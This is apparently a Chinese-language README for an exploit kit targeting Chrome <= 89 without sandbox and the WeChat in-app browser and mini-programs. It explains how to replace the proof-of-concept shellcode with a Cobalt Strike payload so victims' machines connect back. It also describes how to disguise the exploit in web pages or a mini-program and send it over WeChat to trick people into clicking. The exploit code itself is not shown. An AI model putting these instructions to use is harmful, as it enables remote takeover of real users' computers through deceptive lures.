## Chrome 远程执行

`exploit.html`内是弹记事本的POC

用非沙箱模式的chrome打开页面即可攻击成功，

- CTRL+R，”Chrome路径“ -no-sandbox
- 右键编辑Chrome浏览器的快捷方式，目标末尾添加 -no-sandbox

若想替换成Cobalt Strike的Payload

直接用攻击-Payload内生成内容，输出选择c，x64 payload，将'\\'替换成',0'，去掉第一个','放入exploit.html里的shellcode字段内，非沙箱打开页面即可上线

> 该漏洞影响Chrome <= 89.0.4389.114
>
> Pwn2Own大会上一个印度白帽发出一个珍藏的Chrome RCE漏洞POC，据分析与本漏洞一致，hhhhh



## Wechat exp

`exp.js`为弹出计算器的利用脚本，在伪装的html中导入此js脚本即可

Chrome漏洞爆出后几天，有心的黑客突然意识到wechat默认浏览器是Chrome且默认非沙箱，当场伪装到了网页里，通过微信发送诱导点击，实现cs上线



## new Wechat exp

几天内，chrome和wechat立马推出更新，微信将默认浏览器改为了调用用户默认浏览器，不久被人爆出通过微信小程序也可实现攻击，就用上一次的exp就行，只是换了个攻击位置

通过wx开发者工具创建小程序，AppID可选测试号

编辑index.html

`<web-viewsrc="http://youdomain/"> </web-view>`这个链接你可以引用你云端其他地方的js引用，也可以写在小程序里面

启动小程序访问，直接上线